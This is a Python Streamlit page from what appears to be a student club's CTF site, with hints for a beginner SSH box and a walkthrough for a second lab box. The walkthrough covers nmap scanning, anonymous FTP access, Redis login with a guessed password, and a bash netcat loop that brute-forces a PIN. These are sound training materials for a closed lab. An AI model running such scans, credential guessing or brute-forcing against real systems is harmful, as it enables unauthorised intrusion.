import streamlit as st
from utils import layout, footer

layout.load()

st.markdown('<h2 class="section-header">🔐 PWNHUB</h2>', unsafe_allow_html=True)

st.markdown("""
CTF's we started organizing. This website will be updated in due time, but till then, 
find the old website [here](https://github.com/evariste-club/evariste-club.github.io/blob/main/pwnhub/index.html).
""")

# Ellie CTF Box
st.subheader("🎯 Ellie")
st.markdown("""
Our very first box! The goal was to familiarize myself and others with the basic infrastructure, 
`ssh`'ing into a box and using simple commands to retrieve a flag.
""")

with st.expander("Hints for Ellie"):
    with st.expander("🛠 Getting Started"):
        st.markdown("""

        The most important command to know is `man`, which shows the manual for any command.  
        Start by looking up how `ssh` works:

        ```bash
        man ssh
        ```

        You’ll notice that to SSH into the target, the command should be:

        ```bash
        ssh first_time@192.168.33.113
        ```

        > ⚠️ The first time you run this, you'll get a message about host authenticity.  
        Say **yes** to continue.

        Then you'll be asked for the password:

        ```
        GH{}()[]
        ```

        Once you log in, you'll be redirected to a virtual machine.

        ---

        """)
    with st.expander("💻 Inside the Box"):
        st.markdown("""

        You'll be dropped into a minimal terminal using the `sh` shell.  
        It doesn't give you much info, so try switching to something more user-friendly:

        ```bash
        bash
        ```

        Now you're in a more familiar shell environment.

        > 💡 Tip: Use `man man` to read about the `man` command itself!

        Start enumerating with tools like:

        ```bash
        whoami
        ls -la
        cat <filename>
        ```

        Explore the filesystem, look for unusual files, and read their contents — your flag is hidden somewhere in plain sight!

        Good luck!
        """)


# Benjamin CTF Box
st.subheader("🎯 Benjamin")
st.markdown("The second one!")

# Display the meme image
st.image("https://i.imgflip.com/4b0f1g.jpg", width=300, caption="The Meme")

with st.expander("📘 Walkthrough for Benjamin"):
    st.markdown("""
    This box involves scanning, FTP misconfigurations, a Redis database, and eventually brute-forcing a PIN.

    ---

    ### 🔍 Step 1: Find the IP
    First, check your IP address:

    ```bash
    ip addr
    ```

    You’ll find something like `192.168.124.168`. With a `/24` subnet (`255.255.255.0`), `desmond` must be in the `192.168.124.*` range.

    Use `nmap` to scan the network:

    ```bash
    nmap -sP 192.168.124.0/24
    ```

    You'll find `desmond` at `192.168.124.247`.

    ---

    ### 🔍 Step 2: Port Scan
    ```bash
    nmap 192.168.124.247
    ```

    It reveals an FTP server. Try logging in:

    ```bash
    ftp -a 192.168.124.247
    ```

    You’ll get in without credentials due to misconfiguration.

    Inside FTP:

    ```bash
    ls
    ```

    You’ll see files like `flag` and `hint`, but can’t download. No worries — keep going.

    ---

    ### 🧠 Step 3: Deeper Port Scan

    ```bash
    nmap -p- 192.168.124.247
    ```

    Then limit scan to interesting ports (e.g. 696, 3002, 6379):

    ```bash
    nmap -sV -sC -p696,3002,6379 192.168.124.247
    ```

    ---

    ### 🚪 Step 4: Netcat on Port 3002

    Try:

    ```bash
    nc 192.168.124.247 3002
    ```

    You’ll be prompted for a PIN.

    ---

    ### 🔐 Step 5: Redis Exploitation

    ```bash
    redis-cli -h 192.168.124.247
    ```

    Try common passwords:

    ```bash
    AUTH root
    ```

    Then view keys:

    ```bash
    keys *
    get min
    get max
    get what
    ```

    You’ll find a PIN range: **min = 17710**, **max = 19268**

    ---

    ### 🔁 Step 6: Brute-force PIN with a Bash Script

    ```bash
    for i in {17710..19268}; do
        echo $i | nc 192.168.124.247 3002 | grep "not it" > /dev/null
        if [[ $? -ne 0 ]]; then
            echo The correct PIN is $i
            echo $i | nc 192.168.124.247 3002
            break
        fi
    done
    ```

    You’ll find the correct PIN and get the flag!

    ---

    """)

# CTF Progress Tracker
st.subheader("📊 CTF Progress Tracker")



ctf_progress = [
    {"Box": "Ellie", "Difficulty": "Easy", "Status": "Completed", "Points": 100, "Time Taken": "2 hours"},
    {"Box": "Benjamin", "Difficulty": "Medium", "Status": "Completed", "Points": 200, "Time Taken": "4 hours"},
]

st.table(ctf_progress)


footer.load()

